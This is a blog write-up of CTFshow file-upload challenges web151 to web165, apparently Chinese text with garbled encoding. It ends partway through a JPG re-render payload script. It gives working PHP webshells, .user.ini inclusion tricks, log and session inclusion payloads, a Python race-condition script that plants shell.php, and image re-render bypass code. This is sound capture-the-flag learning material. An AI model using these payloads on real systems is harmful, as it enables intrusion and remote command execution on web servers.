---
title: CTFshow æ–‡ä»¶ä¸Šä¼ web151-170
date: 2024-07-30 14:52:41
permalink: /pages/06f28c/
categories:
  - wp
tags:
  - æ–‡ä»¶ä¸Šä¼ 
  - ctfshow
  - ctf
  - wp
author: 
  name: the0n3
  link: https://the0n3.top
---

åœ¨linuxæœåŠ¡å™¨ç±»å‹çš„æ–‡ä»¶ä¸Šä¼ ï¼Œå¤§å¤šè€ƒå¯Ÿå‰ç«¯éªŒè¯æ–‡ä»¶ç±»å‹ï¼Œåç«¯éªŒè¯content-typeã€æ–‡ä»¶åã€æ‰©å±•åã€æ–‡ä»¶å¤´ã€æ–‡ä»¶å†…å®¹ç­‰

## web 151  å‰ç«¯éªŒè¯

f12çœ‹æºç jsï¼Œæ²¡æœ‰å­¦è¿‡jså¤§æ¦‚ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªåŠŸèƒ½ï¼Œåªå…è®¸pngä¸Šä¼ 

![png](/medias/show-upload/1.png)

å‰ç«¯jsé˜²å›å­ä¸é˜²å°äºº(ğŸ˜€)ï¼ŒæŠŠpngä¿®æ”¹ä¸ºphpï¼Œæˆ–è€…æ·»åŠ phpéƒ½å¯ä»¥

![php](/medias/show-upload/2.png)

```
lay-data="{url: 'upload.php', accept: 'images',exts:'png|php'}
```

ä¿®æ”¹åå°±å¯ä»¥ä¸Šä¼ æœ¨é©¬äº†

## web 152 éªŒè¯content-type

f12çœ‹æºç ï¼Œåƒä¸Šé¢˜ä¸€æ ·åšã€‚ä¼šæŠ¥é”™ç±»å‹é”™è¯¯

![f12](/medias/show-upload/3.png)

é‚£ä¹ˆåº”è¯¥æ˜¯postæŠ¥æ–‡é‡Œçš„content-typeè¢«æ£€æµ‹åˆ°äº†ï¼Œç”¨bpæŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹ï¼Œä¿®æ”¹ä¸ºå…è®¸çš„pngå›¾ç‰‡çš„content-typeç±»å‹

![post](/medias/show-upload/4.png)

æŠŠ1.pngæœ¨é©¬åæ”¹å›1.phpï¼Œcontent-typeä¿®æ”¹ä¸ºimage/pngå°±å¯ä»¥ä¸Šä¼ äº†

## web 153 

è¿™æ¬¡åç«¯éªŒè¯æ–‡ä»¶åï¼Œåªèƒ½ä¸Šä¼ pngå›¾ç‰‡é©¬äº†ï¼Œåˆ©ç”¨.user.inié…ç½®æ–‡ä»¶æ¥åŒ…å«å›¾ç‰‡é©¬
å‡†å¤‡ä¸€ä¸ªé©¬1.phpï¼Œä¿®æ”¹ä¸ºpngåç¼€ï¼Œç›´æ¥ä¸Šä¼ 1.png

å‡†å¤‡ä¸€ä¸ª.user.pngæ–‡ä»¶ï¼Œç”¨bpä¿®æ”¹ä¸ºåŸæ¥çš„.user.iniåå­—ï¼Œ.user.iniå†…å®¹

![ini](/medias/show-upload/5.png)

å†™ä¸€ä¸ªé…ç½®é¡¹å³å¯
```ini
# åœ¨æ‰€æœ‰é¡µé¢åŠ è½½å‰ï¼Œè‡ªåŠ¨åŒ…å«æŒ‡å®šæ–‡ä»¶ï¼Œæ–‡ä»¶å†…çš„phpä»£ç ä¼šæ­£å¸¸æ‰§è¡Œ
auto_prepend_file=1.png
# åœ¨æ–‡ä»¶åŠ è½½ååŒ…å«
auto_append_file=1.png
```

æç¤ºæˆåŠŸä¸Šä¼ åˆ°/upload/ç›®å½•ä¸‹ï¼Œåˆ°uploadç›®å½•ä¸‹æˆåŠŸè§£æä¸ºphpæœ¨é©¬

![upload](/medias/show-upload/6.png)

## web 154 æ–‡ä»¶å†…å®¹éªŒè¯

æ­£å¸¸ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œæç¤ºå†…å®¹ä¸åˆè§„

![upload](/medias/show-upload/7.png)

(ç¨åŠ æ€ç´¢.png)ï¼Œå¤§æ¦‚æ˜¯æ–‡ä»¶å†…å®¹å¼€å¤´çš„<?phpè¢«æ£€æµ‹åˆ°äº†ï¼Œç¨åŠ ä¿®æ”¹

```php
<?=highlight_file(__FILE__);eval($_GET[1]);?>
```

ä¸Šä¼ æˆåŠŸã€‚é‚£ä¹ˆå†è¯•è¯•ä¸Šä¸€é¢˜çš„.user.iniè¿˜èƒ½ä¸èƒ½ç”¨ï¼Œä¸Šä¼ .user.pngï¼Œbpä¿®æ”¹ä¸º.user.iniï¼ŒæˆåŠŸä¸Šä¼ å¹¶è§£æphpä»£ç 

![=](/medias/show-upload/8.png)

## web 155 å†…å®¹æ£€æµ‹

æ­£å¸¸ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸å¯¹ï¼Ÿï¼Ÿç”¨ä¸Šé¢˜çš„æ–¹æ³•å¯ä»¥æ­£å¸¸åšå‡ºæ¥ã€‚

å¥½å¥‡ã€‚ç”¨ä¸Šé¢˜çš„æ–¹æ³•æŒ‚é©¬åæŸ¥çœ‹ä¸€ä¸‹è¿™é¢˜çš„æºç ï¼ŒçœŸçš„è¿˜æ˜¯æ£€æµ‹æ–‡ä»¶å†…å®¹

```php
if($_FILES['file']['type'] == 'image/png'){
            $arr = pathinfo($filename);
            $ext_suffix = $arr['extension'];
            if($ext_suffix!='php'){
                $content = file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content, "php")===FALSE){
                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                    $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
                }else{
                    $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
                }
                
            }else{
                $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
            }
    		
    	}else{
    		$ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
    	}
```

## web 156 å†…å®¹æ£€æµ‹

è¿™æ¬¡è¿˜æ˜¯å†…å®¹æ£€æµ‹ã€‚è¿‡æ»¤äº†'php'å­—ç¬¦ä¸²,'[]'ä¸­æ‹¬å·ç­‰ã€‚å­¦åˆ°äº†æ–°æ–¹æ³•ã€‚åŸæ¥è¿˜èƒ½ç”¨èŠ±æ‹¬å·

![èŠ±èŠ±](/medias/show-upload/9.png)

```php
<?=eval($_GET{1});?>
```

![èŠ±èŠ±](/medias/show-upload/10.png)

åˆgetåˆ°äº†

## web 157 å†…å®¹æ£€æµ‹

è¿™é¢˜åˆè¿‡æ»¤äº†{}èŠ±æ‹¬å·ï¼Œåˆ†å·ï¼Œ'log'ã€‚æ€è·¯è¿˜å’Œä¸Šé¢ä¸€æ ·ï¼Œä¸è¿‡å˜æˆäº†RCEç±»å‹çš„é¢˜ç›®äº†

è¿˜æ˜¯æ­£å¸¸ä¸Šä¼ .user.pngæ–‡ä»¶ï¼ŒbpæŠ“åŒ…æŠŠæ–‡ä»¶åæ”¹æˆ.user.iniã€‚æ¥ç€å¤„ç†å›¾ç‰‡é©¬

```php
<?=`ls /var/www/html`?>
```

ç°åœ¨ç›´æ¥ä½¿ç”¨åå¼•å·æ‰§è¡Œå‘½ä»¤ï¼Œæ²¡æœ‰åˆ†å·ç”¨?>å¼ºåˆ¶é—­åˆ

![ls](/medias/show-upload/11.png)

æ¯ä¸ªé©¬æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œè¿‡æ»¤äº†'php'ï¼Œç”¨ç»Ÿé…ç¬¦å¤„ç†

```php
<?=`tac /var/www/html/f*`?>
```

![tac](/medias/show-upload/12.png)

## web 158 å†…å®¹æ£€æµ‹

åŒä¸Š

```php
preg_match('/php|\{|\[|\;|log/i', $str);
```

æ£€æŸ¥upload.phpæºç å‘ç°è¿‡æ»¤æ–°å¢äº†logï¼Œé‚£ä¹ˆä¸Šä¸€é¢˜é¢˜åº”è¯¥è€ƒå¯Ÿæ—¥å¿—åŒ…å«äº†ï¼Œæˆ–è®¸è¿™é¢˜è€ƒå¯Ÿçš„æ‰æ˜¯åå¼•å·å‘½ä»¤æ‰§è¡Œï¼Ÿ

<?=include'/var/log/nginx/access.log'?>

æˆ‘å›å»è¯•è¯•ï¼Œç­‰æˆ‘

æµ‹è¯•æˆåŠŸï¼Œçœ‹æ¥web157è€ƒå¯Ÿçš„çœŸæ˜¯æ—¥å¿—åŒ…å«ï¼Œä¸è¿‡æ—¢ç„¶includeç»“æ„å’Œå‡½æ•°éƒ½èƒ½ç”¨ï¼Œé‚£ä¹ˆsessionåŒ…å«åº”è¯¥ä¹Ÿæ˜¯è¡ŒåŠ¨é€šçš„ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è¯•è¯•

![log](/medias/show-upload/13.png)

:::warning
å¾€ååšäº†å‡ é¢˜åçŒ›å›å¤´ï¼Œæ—¢ç„¶.user.iniä¸­çš„**auto_prepend_file**é…ç½®é¡¹åŠŸèƒ½å°±æ˜¯æ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆå¤šæ¬¡ä¸€ä¸¾å†ç”¨ä¸€ä¸ª1.pngçš„å›¾ç‰‡é©¬æ¥å®ç°æ–‡ä»¶åŒ…å«ï¼Œæ—¥å¿—åŒ…å«ï¼ŒsessionåŒ…å«å‘¢ï¼Ÿä¸å¤ªè¡Œï¼Œphpå¯ä»¥åˆ©ç”¨`.`æ¥å®ç°æ‹¼æ¥ç»•è¿‡è¿‡æ»¤ï¼Œiniæ–‡ä»¶ä¸èƒ½æ‹¼æ¥æ²¡æœ‰phpç©æ³•å¤šï¼Œç¦ç”¨'log'ç›´æ¥gï¼Œæˆ‘ä»¬æ˜¯èªæ˜å®è´ä¸ä¸Šå½“(æŸ´éƒ¡çŒ«çŒ«)
:::


## web 159 å†…å®¹æ£€æµ‹

è¿˜æ˜¯å¯ä»¥ä¸Šé¢ç”¨åå¼•å·å‘½ä»¤æ‰§è¡Œé©¬çš„ç©æ³•ï¼Œè¿›è¡Œä¸Šä¼ æµ‹è¯•ï¼ŒæˆåŠŸã€‚

```php
<?=`tac /var/www/html/f*`?>
```

éƒ¨åˆ†æºç 

```php
preg_match('/php|\{|\[|\;|log|\(/i', $str);
```


çœ‹upload.phpæºç ï¼Œè¿™å›è¿‡æ»¤äº†è‹±æ–‡åŠè§’æ‹¬å·ï¼Œç¦ç”¨å‡½æ•°äº†ï¼Œä¸è¿‡includeè¯­æ³•ç»“æ„è¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œlogè¿‡æ»¤äº†ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è¯•è¯•sessionåŒ…å«ï¼Œéœ€è¦æ¡ä»¶ç«äº‰

```php
<?=include'/tmp/sess_sessionID'>
```

## web 160 å†…å®¹æ£€æµ‹

åå¼•å·æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•è¡Œä¸é€šäº†ï¼Œå¤§æŠµè¢«banäº†ï¼Œçœ‹äº†å¸ˆå‚…ä»¬çš„åšæ³•ï¼Œåˆå­¦åˆ°äº†ï¼Œæœ¬ä»¥ä¸ºç¦ç”¨'log'å°±ä¸èƒ½æ–‡ä»¶åŒ…å«äº†ï¼Œæ²¡æƒ³åˆ°å¸ˆå‚…ä»¬ç«Ÿç„¶æ‹¼æ¥æ¥å®ç°äº†

```php
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

![log](/medias/show-upload/14.png)

æŸ¥çœ‹æºç ,è¿‡æ»¤äº†ç©ºæ ¼å’Œåå¼•å·

```php
preg_match('/php|\{|\[|\;|log|\(| |\`/i', $str);
```

## web 161 æ£€æµ‹æ–‡ä»¶å¤´

è¿™é¢˜æ·»åŠ æ–°çš„é™åˆ¶ï¼šæ–‡ä»¶å¤´ï¼Œç»™ä¸Šé¢å›¾ç‰‡é©¬æ·»åŠ äº†ä¸€ä¸ªGIF89açš„æ–‡ä»¶å¤´ï¼Œä¸Šä¼ æˆåŠŸ
```php
GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

.user.iniä¹Ÿè¦åŠ ä¸ŠGIF89aæ–‡ä»¶å¤´ï¼Œä¸Šä¼ æˆåŠŸ
![add](/medias/show-upload/15.png)

è®²è®²å…¶ä»–

è¿™é“é¢˜çš„éƒ¨åˆ†æºç 

```php
if($ext_suffix!='php'){
                $content = file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content, "php")===FALSE && check($content) && getimagesize($_FILES["file"]["tmp_name"])){
                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                    $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
                }else{
                    $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
                }
                
            }else{
                $ret = array("code"=>2,"msg"=>"æ–‡ä»¶ç±»å‹ä¸åˆè§„");
            }
```
åœ¨ç¬¬å››è¡Œå‡ºç°äº†getimagesizeï¼Œçœ‹å‡½æ•°åå°±å¯ä»¥çŸ¥é“æ˜¯æ£€æŸ¥å›¾ç‰‡æ–‡ä»¶å¤§å°ï¼Œå‡ºé¢˜äººç«Ÿç„¶ç”¨åœ¨è¿™é‡Œæ¥æ£€æŸ¥æ˜¯ä¸æ˜¯å›¾ç‰‡(æ¼)ï¼Œçœ‹åˆ°æ–‡ä»¶åæˆ‘è·³è¿‡å»äº†ï¼Œè¿˜ç–‘æƒ‘ä¸ºä»€ä¹ˆæ•´ä»½æºç æ²¡æœ‰æ£€æŸ¥æ–‡ä»¶å¤´çš„ä»£ç 

çœ‹çœ‹å®˜æ–¹æ–‡æ¡£[PHPå®˜æ–¹å¯¹è¯¥å‡½æ•°çš„è§£æ](https://www.php.net/manual/zh/function.getimagesize.php)

![getimagesize](/medias/show-upload/16.png)

## web 162 sessionåŒ…å«

å¯æ¶ï¼ç«Ÿç„¶è¿˜æ˜¯èº²ä¸æ‰ã€‚åˆ°äº†ç´§å¼ åˆºæ¿€çš„sessionåŒ…å«ï¼Œæˆ‘ä¹‹å‰å†™è¿‡ä¸€ç¯‡[sessionåŒ…å«](/pages/07a506/)

è¿™é¢˜æµ‹è¯•ä¸Šä¸€é¢˜çš„è§£æ³•è¡Œä¸é€šäº†ï¼Œåº”è¯¥æ˜¯æŠŠ.ä¹Ÿè¿‡æ»¤äº†ï¼Œç¦æ­¢é€šè¿‡æ‹¼æ¥æ¥ç»•è¿‡ï¼Œé‚£å°±è¯•è¯•sessionåŒ…å«

å›¾ç‰‡é©¬test.pngï¼Œä¸Šä¼ æ—¶bpæŠŠæ‰©å±•åå»æ‰
```php
GIF89a
<?=include"/tmp/sess_Cola"?>
```
![test](/medias/show-upload/18.png)

è¿™ä¸ªçƒ§é¢˜ï¼Œä¸å¸¦æ‰©å±•åçš„æ–‡ä»¶ä¹Ÿå¯ä»¥ä¸Šä¼ (æ¼)ï¼Œå¸¦GIF89aå¤´è¿‡getimagesizeå‡½æ•°ï¼Œé‚£ç©æ³•å°±å¤šäº†

```ini
GIF89a
auto_prepend_file=test
```

æŠŠ.user.iniä¼ ä¸Šå»

![ini](/medias/show-upload/17.png)

å‡†å¤‡æ¡ä»¶ç«äº‰è„šæœ¬
```python
import requests
import threading
import time

# å¦‚æœé¢˜ç›®é“¾æ¥æ˜¯httpsï¼Œæ¢æˆhttp
# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
url = 'http://c451c8da-a286-4835-a23a-bd6cd7e91f5a.challenge.ctf.show/upload/'
sessionid = 'Cola'
data = {
    # sessionæ–‡ä»¶å†…å®¹
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php phpinfo();?>");?>',
    # sessionæ–‡ä»¶è·¯å¾„å¯èƒ½ä¸åŒ
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# ä¸Šä¼ æ–‡ä»¶å‡½æ•°
def upload_file():
    while True:
        response = requests.post(url, data=data, files=file, cookies=cookies)
        time.sleep(1)  # ä¸ºäº†é¿å…å‘é€è¯·æ±‚è¿‡å¿«ï¼Œå¯ä»¥é€‚å½“å¢åŠ é—´éš”æ—¶é—´

# æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²åˆ›å»º
def check_file():
    while True:
        r = requests.get(url + 'shell.php')
        if r.status_code == 200:
            print('Webshell created successfully')
            print(r.text)
            break
        else:
            print('errorï¼š', r.status_code)
        # time.sleep(1)  # ä¸ºäº†é¿å…å‘é€è¯·æ±‚è¿‡å¿«ï¼Œå¯ä»¥é€‚å½“å¢åŠ é—´éš”æ—¶é—´

# åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹
threads = []
for _ in range(5):  # åˆ›å»º5ä¸ªä¸Šä¼ çº¿ç¨‹
    t = threading.Thread(target=upload_file)
    t.start()
    threads.append(t)

for _ in range(5):  # åˆ›å»º5ä¸ªæ£€æŸ¥çº¿ç¨‹
    t = threading.Thread(target=check_file)
    t.start()
    threads.append(t)

# ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆ
for t in threads:
    t.join()

```
è„šæœ¬è·‘å®Œå°±å†™å…¥shell.phpäº†ï¼Œæœ¨é©¬å†…å®¹å¯ä»¥åœ¨è„šæœ¬é‡Œä¿®æ”¹
![shell](/medias/show-upload/19.png)

ä¾‹å¦‚ç›´æ¥æŸ¥çœ‹flagï¼Œæ³¨æ„è½¬ä¹‰
```
'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php system(\'tac /var/www/html/flag.php\');?>");?>',
```

![flag](/medias/show-upload/20.png)

è¿™é¢˜çœ‹åˆ«çš„å¸ˆå‚…æ˜¯ä½¿ç”¨vpsï¼ŒæŠŠipè½¬æˆå•ä¸ªæ•°å­—é¿å….çš„å‡ºç°æ¥åšçš„

## web 163  æ¡ä»¶ç«äº‰

è¿™é¢˜å¦‚æœä¸Šä¼ ä¸Šä¸€é¢˜çš„test.pngï¼Œä»¥åŠ.user.pngï¼Œå†å»æ‰test.pngçš„.pngï¼ŒæŠŠ.user.iniä¿®æ”¹ä¸º.user.iniæ—¶ï¼Œé¡µé¢ä¼šæç¤ºæ²¡æœ‰testè¿™ä¸ªæ–‡ä»¶ï¼Œæ— æ³•åŒ…å«

url/testï¼Œåˆ°äº†é¦–é¡µï¼Œurl/.user.iniä¼šä¸‹è½½.user.iniï¼Œè¯´æ˜.user.iniè¿˜åœ¨ï¼Œé‚£ä¹ˆå¯ä»¥çœç•¥æ‰test.pngè¿™ä¸€æ­¥ï¼Œè®©.user.iniç›´æ¥ç»™å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶åŒ…å«sessionæ–‡ä»¶


```ini
GIF89a
auto_prepend_file=/tmp/sess_Cola
```

ä¸Šä¼ .user.iniåï¼Œå†æ¬¡ä½¿ç”¨ä¸Šé¢˜çš„è„šæœ¬ï¼Œå‘ç°è¿™æ¬¡è·‘äº†å¾ˆä¹…ï¼Œä¸è¿‡è¿˜å¥½ï¼Œè¿˜æ˜¯å‡ºæ¥äº†

## web 164 pngäºŒæ¬¡æ¸²æŸ“

å‚è€ƒ[å¤§ä½¬æ–‡ç« ](https://www.cnblogs.com/sen-y/p/15579078.html#autoid-11-0-0)ï¼Œåˆå­¦åˆ°äº†

:::tip
äºŒæ¬¡æ¸²æŸ“
å°†ä¸€ä¸ªæ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ã€‚å…·ä½“å®ç°éœ€è¦è‡ªå·±ç¼–å†™Pythonç¨‹åºï¼Œäººå·¥å°è¯•åŸºæœ¬æ˜¯ä¸å¯èƒ½æ„é€ å‡ºèƒ½ç»•è¿‡æ¸²æŸ“å‡½æ•°çš„å›¾ç‰‡webshellçš„ã€‚
å¤§ä½¬é“¾æ¥ï¼šhttps://www.fujieace.com/penetration-test/upload-labs-pass-16.html
:::

è¿™é¢˜åªèƒ½ä¸Šä¼ æ­£å¸¸çš„pngå›¾ç‰‡ï¼Œåœ¨å›¾ç‰‡é‡Œåšæ‰‹è„šæ·»åŠ PHPä»£ç ä¼šäºŒæ¬¡æ¸²æŸ“

:::tip
ç½‘ç«™ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼ˆæ ¼å¼ã€å°ºå¯¸ï¼Œä¿å­˜ï¼Œåˆ é™¤ è¦æ±‚ç­‰ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šæŠŠé‡Œé¢çš„å†…å®¹è¿›è¡Œæ›¿æ¢æ›´æ–°ï¼Œå¤„ç†å®Œæˆåï¼Œæ ¹æ®æˆ‘ä»¬åŸæœ‰çš„å›¾ç‰‡ç”Ÿæˆä¸€ä¸ªæ–°çš„å›¾ç‰‡ï¼ˆæ ‡å‡†åŒ–ï¼‰å¹¶æ”¾åˆ°ç½‘ç«™å¯¹åº”çš„æ ‡ç­¾è¿›è¡Œæ˜¾ç¤ºã€‚
:::

è¿™é‡Œå€Ÿç”¨äºŒæ¬¡æ¸²æŸ“ç»•è¿‡è„šæœ¬
```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
 
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'1.png');  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„
 
/* æœ¨é©¬å†…å®¹
<?$_GET[0]($_POST[1]);?>
 */
//imagepng($img,'1.png');  è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨
//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡
//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);
//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php
?>
```

äºŒæ¬¡æ¸²æŸ“ç»•è¿‡å›¾ç‰‡é©¬

![cola](/medias/show-upload/cola.png)

æµ‹è¯•æˆåŠŸ

![success](/medias/show-upload/21.png)

è¿™é‡Œæ‰§è¡Œå‘½ä»¤çœ‹ä¸åˆ°ç»“æœï¼Œå¯ä»¥ä¸‹è½½å›¾ç‰‡ï¼ŒNotepad++æ‰“å¼€çœ‹å›¾ç‰‡å†…å®¹ï¼Œå‘½ä»¤æ‰§è¡Œå›æ˜¾åœ¨å›¾ç‰‡é‡Œï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠŠflagè¾“å‡ºåˆ°æ–°æ–‡ä»¶é‡Œ

![tac](/medias/show-upload/22.png)

![flag](/medias/show-upload/23.png)


ç–‘æƒ‘ï¼šè¿™é¢˜çš„å›¾ç‰‡ä¸ºä»€ä¹ˆä¼šè§£æPHPä»£ç ï¼Ÿ

```php
$file= $_GET['image'];

$file = strrev($file);
$ext = strrev(substr($file, 0,4));
if($ext==='.png' && file_exists("./upload/".strrev($file))){
	header('Content-Type:image/png');
	include("./upload/".strrev($file));
}else{
	echo "å›¾ç‰‡é”™è¯¯";
}
```
åœ¨è¿™ä¸ªæŸ¥çœ‹å›¾ç‰‡çš„é¡µé¢ä½¿ç”¨äº†includeæ–‡ä»¶åŒ…å«ï¼Œé€šè¿‡Getä¼ å‚æ¥åŒ…å«æŒ‡å®šæ–‡ä»¶ï¼Œä½†æœ‰é™åˆ¶äº†ç›®å½•ï¼Œæ‰€ä»¥ä¼¼ä¹ä¸èƒ½æ—¥å¿—åŒ…å«ç­‰ç­‰æ“ä½œ

## web 165 jpgäºŒæ¬¡æ¸²æŸ“

å‚è€ƒï¼š

- [ctfshow webå…¥é—¨æ–‡ä»¶ä¸Šä¼ ](https://www.cnblogs.com/sen-y/p/15579078.html#autoid-11-0-0)
- [CTFshow-æ–‡ä»¶ä¸Šä¼ ](https://happyfire.xyz/archives/ctfshow--wen-jian-shang-chuan#toc-head-15)
- [ctfshowå­¦ä¹ è®°å½•-webå…¥é—¨ï¼ˆæ–‡ä»¶ä¸Šä¼ 161-170ï¼‰](https://blog.csdn.net/m0_48780534/article/details/126723967#web165_160)

:::warning
jpgäºŒæ¬¡æ¸²æŸ“å›¾ç‰‡é©¬ä¸èƒ½é è„šæœ¬ç›´æ¥ç”Ÿæˆï¼Œä½ éœ€è¦å…ˆä¸Šä¼ åŸå›¾ï¼Œå†ctrl+sæŠŠæ¸²æŸ“åçš„å›¾ç‰‡å†ä¿å­˜ä¸‹æ¥ï¼Œç°åœ¨ä½ æ‰å¯ä»¥ä½¿ç”¨ä¸‹é¢è„šæœ¬å†æ¬¡æ¸²æŸ“

æ­¤å¤„é©»ç•™ç”šä¹…ï¼Œå‘Šä¹‹åæ¥è€…
:::

æŠŠç½‘ç«™æ¸²æŸ“è¿‡ä¸€æ¬¡çš„å›¾ç‰‡ä¿å­˜ä¸‹æ¥ï¼Œä½¿ç”¨ä¸‹é¢è„šæœ¬å†æ¬¡æ¸²æŸ“

jpgäºŒæ¬¡æ¸²æŸ“è„šæœ¬

```php
<?php
    /*
å°†æœ‰æ•ˆè½½è·æ³¨å…¥JPGå›¾åƒçš„ç®—æ³•ï¼Œè¯¥ç®—æ³•åœ¨PHPå‡½æ•°imagecopyresized()å’Œimagecopyresampled()å¼•èµ·çš„å˜æ¢åä¿æŒä¸å˜ã€‚
åˆå§‹å›¾åƒçš„å¤§å°å’Œè´¨é‡å¿…é¡»ä¸å¤„ç†åçš„å›¾åƒçš„å¤§å°å’Œè´¨é‡ç›¸åŒã€‚
1)é€šè¿‡å®‰å…¨æ–‡ä»¶ä¸Šä¼ è„šæœ¬ä¸Šä¼ ä»»æ„å›¾åƒ
2)ä¿å­˜å¤„ç†åçš„å›¾åƒå¹¶å¯åŠ¨:
php æ–‡ä»¶å.php <æ–‡ä»¶å.jpg >
å¦‚æœæ³¨å°„æˆåŠŸï¼Œæ‚¨å°†è·å¾—ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒï¼Œè¯¥å›¾åƒåº”å†æ¬¡ä¸Šä¼ ã€‚
ç”±äºä½¿ç”¨äº†æœ€ç›´æ¥çš„æ³¨å°„æ–¹æ³•ï¼Œå¯èƒ½ä¼šå‡ºç°ä»¥ä¸‹é—®é¢˜:
1)åœ¨ç¬¬äºŒæ¬¡å¤„ç†ä¹‹åï¼Œæ³¨å…¥çš„æ•°æ®å¯èƒ½å˜å¾—éƒ¨åˆ†æŸåã€‚
jpg _ payload.phpè„šæœ¬è¾“å‡ºâ€œæœ‰é—®é¢˜â€ã€‚
å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œè¯·å°è¯•æ›´æ”¹æœ‰æ•ˆè½½è·(ä¾‹å¦‚ï¼Œåœ¨å¼€å¤´æ·»åŠ ä¸€äº›ç¬¦å·)æˆ–å°è¯•å¦ä¸€ä¸ªåˆå§‹å›¾åƒã€‚
è°¢å°”ç›–Â·åšå¸ƒç½—å¤«@Black2Fanã€‚
å¦è¯·å‚è§:
https://www . idontplaydarts . com/2012/06/encoding-we B- shell-in-png-idat-chunks/
*/

    $miniPayload = '<?=eval($_POST[1]);?>';
 
 
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
    
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
 
    set_error_handler("custom_error_handler");
 
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
 
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
 
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
